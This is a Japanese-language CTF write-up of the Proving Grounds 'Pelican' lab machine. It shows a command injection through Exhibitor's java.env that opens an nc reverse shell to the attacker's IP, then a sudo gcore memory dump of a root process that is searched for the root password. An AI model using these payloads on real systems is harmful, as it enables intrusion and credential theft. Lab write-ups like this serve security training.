+++
title = "Proving Grounds Practice - Pelican Writeup"
date = "2026-10-08"
description = "Exhibitor for ZooKeeperの設定を悪用して初期アクセスを取得し、sudoで許可されたgcoreからrootプロセスのメモリをダンプしてrootパスワードを取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[ZooKeeper]", "[Exhibitor]", "[gcore]", "[sudo]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field   | Details |
| ------- | ------- |
| Machine | Pelican |
| OS      | Linux   |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- 192.168.129.98
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 23:04 +0900
Nmap scan report for 192.168.129.98
Host is up (0.11s latency).
Not shown: 65503 closed tcp ports (reset)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open     netbios-ssn     Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn     Samba 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open     ipp             CUPS 2.2
2181/tcp  open     zookeeper       Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open     ssh             OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open     http            Jetty 1.0
8081/tcp  open     http            nginx 1.14.2
39605/tcp open     java-rmi        Java RMI
```

特に気になったのは以下のサービスです。

```text
2181/tcp  open  zookeeper
8080/tcp  open  http  Jetty 1.0
8081/tcp  open  http  nginx 1.14.2
```

8081/tcpから8080/tcpのExhibitorへリダイレクトされることも確認できます。

```text
|_http-title: Did not follow redirect to
http://192.168.129.98:8080/exhibitor/v1/ui/index.html
```

---

## Initial Access

### Exhibitor for ZooKeeper

ブラウザから8080/tcpへアクセスすると、

```text
Exhibitor for ZooKeeper v1.0
```

が表示されました。

そこで `Exhibitor for ZooKeeper` について調査したところ、Exhibitorの設定を利用したコマンド実行に関するExploitを発見しました。

Exploit-DB:

```text
https://www.exploit-db.com/exploits/48654
```

このExploitでは、`java.env` スクリプトを利用してコマンドを実行します。

今回、`java.env` に以下の内容を設定しました。

```bash
$(/bin/nc -e /bin/sh 192.168.45.202 4444 &)
```

Kali側でリスナーを起動します。

```bash
nc -lvnp 4444
```

ターゲットから接続され、

```text
listening on [any] 4444 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.129.98] 55362
```

シェルを確認します。

```bash
whoami
```

```text
charles
```

初期アクセスとして `charles` ユーザーのシェルを取得できました。

---

## Privilege Escalation

### LinPEAS

取得したシェルからLinPEASを転送します。

Kali側：

```bash
python3 -m http.server 8000
```

ターゲット側：

```bash
wget http://192.168.45.202:8000/linpeas.sh
```

実行します。

```bash
chmod +x linpeas.sh
./linpeas.sh
```

sudoの権限を確認すると、以下が見つかりました。

```bash
sudo -l
```

```text
(ALL) NOPASSWD: /usr/bin/gcore
```

つまり、`charles` はパスワードなしで `/usr/bin/gcore` をroot権限で実行できます。

---

### gcore

`gcore` は実行中のプロセスのメモリをcore dumpとして保存することができます。

まずrootで動作しているプロセスを確認します。

```bash
ps -eo user,pid,cmd | awk '$1=="root" && $3 !~ /^\[/ {print}'
```

その中から、パスワードを扱っている可能性のある

```text
root  513  ... /usr/bin/password-store
```

を発見しました。

PIDを確認します。

```bash
ps -p 513 -f
```

```text
UID   PID  PPID  C STIME TTY TIME CMD
root  513  1    0 10:00 ?   00:00:00 /usr/bin/password-store
```

rootで動作している `password-store` のメモリをダンプします。

```bash
sudo -n /usr/bin/gcore -o /tmp/core.513 513
```

```text
Saved corefile /tmp/core.513.513
```

`gcore` の `-o` はファイル名のプレフィックスとして扱われるため、PID `513` が自動的に付加され、

```text
/tmp/core.513.513
```

というファイルが作成されます。

---

### Root Password Extraction

core dumpから文字列を抽出し、パスワード関連の文字列を検索します。

```bash
strings /tmp/core.513.513 | grep -Ei 'password|passwd|secret|token|credential|root|flag'
```

その中から、

```text
001 Password: root:
```

という文字列を発見しました。

周辺の文字列を確認します。

```bash
strings /tmp/core.513.513 | grep -n -C 10 '001 Password:'
```

```text
001 Password: root:
ClogKingpinInning731
```

`ClogKingpinInning731` がrootユーザーのパスワードであることが分かりました。

---

## Root

取得したパスワードを使用してrootへ切り替えます。

```bash
su - root
```

```text
Password: ClogKingpinInning731
```

rootシェルを取得できました。

```bash
whoami
```

```text
root
```

rootのホームディレクトリを確認します。

```bash
ls
```

```text
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
proof.txt
```

Proofを確認します。

```bash
cat proof.txt
```

---

## Summary

今回の攻撃経路は以下の通りです。

```text
Nmap
  ↓
8080/tcp - Exhibitor for ZooKeeper
  ↓
Exhibitorの脆弱性を利用
  ↓
java.envにリバースシェルを設定
  ↓
charlesとしてInitial Access
  ↓
sudo -l
  ↓
NOPASSWD: /usr/bin/gcore
  ↓
rootプロセスを列挙
  ↓
/usr/bin/password-store (PID 513) を発見
  ↓
gcoreでrootプロセスのメモリをダンプ
  ↓
stringsでcore dumpを検索
  ↓
root password: ClogKingpinInning731
  ↓
su - root
  ↓
SYSTEM/root
```

### Key Commands

```bash
# Port scan
nmap -sV -sC -p- 192.168.129.98

# Reverse shell listener
nc -lvnp 4444

# Check sudo privileges
sudo -l

# Find root processes
ps -eo user,pid,cmd | awk '$1=="root" && $3 !~ /^\[/ {print}'

# Dump root process memory
sudo -n /usr/bin/gcore -o /tmp/core.513 513

# Search the core dump
strings /tmp/core.513.513 | grep -n -C 10 '001 Password:'

# Become root
su - root
```
